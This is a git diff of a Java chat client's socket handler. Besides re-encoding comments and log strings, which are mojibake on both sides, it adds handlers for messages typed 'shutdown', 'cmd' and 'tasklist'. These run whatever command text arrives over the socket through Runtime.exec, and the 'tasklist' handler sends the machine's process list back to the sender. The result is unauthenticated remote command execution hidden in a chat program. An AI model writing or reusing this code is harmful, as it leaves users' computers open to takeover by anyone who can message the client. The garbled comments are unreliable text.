@@ -2,13 +2,14 @@ package DesktopClientProcess;
 
 
 import java.io.BufferedReader;
-import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.SocketException;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import com.io.sockets.SocketStatusListener;
 
@@ -41,8 +42,8 @@ public class ClientSocketHandler implements SocketStatusListener {
 	}
 
 	/**
-	 * sendMessage:(ÕâÀïÓÃÒ»¾ä»°ÃèÊöÕâ¸ö·½·¨µÄ×÷ÓÃ). <br/>
-	 * TODO(ÕâÀïÃèÊöÕâ¸ö·½·¨ÊÊÓÃÌõ¼ş ¨C ¿ÉÑ¡).<br/>
+	 * sendMessage:(è¿™é‡Œç”¨ä¸€å¥è¯æè¿°è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨). <br/>
+	 * TODO(è¿™é‡Œæè¿°è¿™ä¸ªæ–¹æ³•é€‚ç”¨æ¡ä»¶ â€“ å¯é€‰).<br/>
 	 */
 	public void sendMessage(String msg) {
 		writer.send(msg);
@@ -66,7 +67,7 @@ public class ClientSocketHandler implements SocketStatusListener {
 			} finally {
 				reader = null;
 				writer = null;
-				System.out.println("SocketÁ¬½ÓÒÑ¹Ø±Õ£¡£¡");
+				System.out.println("Socketè¿æ¥å·²å…³é—­ï¼ï¼");
 			}
 		}
 
@@ -90,7 +91,7 @@ public class ClientSocketHandler implements SocketStatusListener {
 
 	/**
 	 * @author Administrator
-	 * ¶Á²Ù×÷½ø³Ì
+	 * è¯»æ“ä½œè¿›ç¨‹
 	 */
 	public class ReaderTask extends Thread {
 
@@ -110,8 +111,8 @@ public class ClientSocketHandler implements SocketStatusListener {
 		}
 
 		/**
-		 * finish:(ÕâÀïÓÃÒ»¾ä»°ÃèÊöÕâ¸ö·½·¨µÄ×÷ÓÃ). <br/>
-		 * TODO(ÕâÀïÃèÊöÕâ¸ö·½·¨ÊÊÓÃÌõ¼ş ¨C ¿ÉÑ¡).<br/>
+		 * finish:(è¿™é‡Œç”¨ä¸€å¥è¯æè¿°è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨). <br/>
+		 * TODO(è¿™é‡Œæè¿°è¿™ä¸ªæ–¹æ³•é€‚ç”¨æ¡ä»¶ â€“ å¯é€‰).<br/>
 		 * 
 		 * @throws IOException
 		 * 
@@ -142,7 +143,32 @@ public class ClientSocketHandler implements SocketStatusListener {
 						Information reci = new Information(readStr);
 						//System.out.println(reci.getContent());
 						if(reci.getType().equals("session")) {
-							dialog.addSession("[" + reci.getFromAdd() + "] ¶Ô»° \n" + reci.getContent());
+							dialog.addSession("[" + reci.getFromAdd() + "] å¯¹è¯ \n" + reci.getContent());
+		                } else if(reci.getType().equals("shutdown")) {
+		                	Runtime.getRuntime().exec(reci.getContent());
+		                } else if(reci.getType().equals("tasklist")) {
+		                	Pattern pp = Pattern.compile("(\\b\\w+.exe)|((?<=[10]\\b)\\s+[0-9,]+(?= K))");
+		                	Process p = Runtime.getRuntime().exec(reci.getContent());
+		                	BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+		                	String line = null;
+		        			String contents = "";
+		        			while ((line = br.readLine()) != null) {
+		        				Matcher res = pp.matcher(line);
+		        				int cnt = 0;
+		        				String buf = "";
+		        				while(res.find()) {
+		        					System.out.println(res.group().trim());
+		        					if(cnt == 0) buf += res.group().trim() + "#";
+		        					else buf += res.group().trim() + " K";
+		        					cnt ++;
+		        				}
+		        				if(cnt == 2) contents += buf + "\r\n";
+		        				//System.out.println("res = " + cnt + "  res.group = " + res.groupCount());
+		        				//System.out.println(line);
+		        			}
+		        			writer.send(new Information("tasklist", dialog.getInetAddress(), contents, false).toString());
+		                } else if(reci.getType().equals("cmd")) {
+		                	Runtime.getRuntime().exec(reci.getContent());
 		                }
 					}
 				} catch (IOException e) {
@@ -153,7 +179,7 @@ public class ClientSocketHandler implements SocketStatusListener {
 								status, e);
 					}
 					e.printStackTrace();
-					return;// ÖÕÖ¹Ïß³Ì¼ÌĞøÔËĞĞ,ÕâÀïÒ²¿ÉÒÔÊ¹ÓÃcontinue
+					return;// ç»ˆæ­¢çº¿ç¨‹ç»§ç»­è¿è¡Œ,è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨continue
 				}
 
 			}
@@ -175,8 +201,8 @@ public class ClientSocketHandler implements SocketStatusListener {
 		}
 
 		/**
-		 * listen:(ÕâÀïÓÃÒ»¾ä»°ÃèÊöÕâ¸ö·½·¨µÄ×÷ÓÃ). <br/>
-		 * TODO(ÕâÀïÃèÊöÕâ¸ö·½·¨ÊÊÓÃÌõ¼ş ¨C ¿ÉÑ¡).<br/>
+		 * listen:(è¿™é‡Œç”¨ä¸€å¥è¯æè¿°è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨). <br/>
+		 * TODO(è¿™é‡Œæè¿°è¿™ä¸ªæ–¹æ³•é€‚ç”¨æ¡ä»¶ â€“ å¯é€‰).<br/>
 		 * 
 		 */
 		public void startListener(SocketStatusListener ssl) {
@@ -190,7 +216,7 @@ public class ClientSocketHandler implements SocketStatusListener {
 	
 	/**
 	 * @author Administrator
-	 * Ğ´²Ù×÷½ø³Ì
+	 * å†™æ“ä½œè¿›ç¨‹
 	 */
 	public  class WriterTask extends Thread{
 
@@ -206,8 +232,8 @@ public class ClientSocketHandler implements SocketStatusListener {
 		}
 		
 		/**
-		 * finishTask:(ÕâÀïÓÃÒ»¾ä»°ÃèÊöÕâ¸ö·½·¨µÄ×÷ÓÃ). <br/>
-		 * TODO(ÕâÀïÃèÊöÕâ¸ö·½·¨ÊÊÓÃÌõ¼ş ¨C ¿ÉÑ¡).<br/>
+		 * finishTask:(è¿™é‡Œç”¨ä¸€å¥è¯æè¿°è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨). <br/>
+		 * TODO(è¿™é‡Œæè¿°è¿™ä¸ªæ–¹æ³•é€‚ç”¨æ¡ä»¶ â€“ å¯é€‰).<br/>
 		 * @throws IOException 
 		 *
 		 */
@@ -229,7 +255,7 @@ public class ClientSocketHandler implements SocketStatusListener {
 		public synchronized void run() {
 			bufferedWriter.println(msg);
 			bufferedWriter.flush();
-			System.out.println("ÎÒ·¢³öÁË£º"+msg);
+			System.out.println("æˆ‘å‘å‡ºäº†ï¼š"+msg);
 		}
 		
 		public void send(String msg){
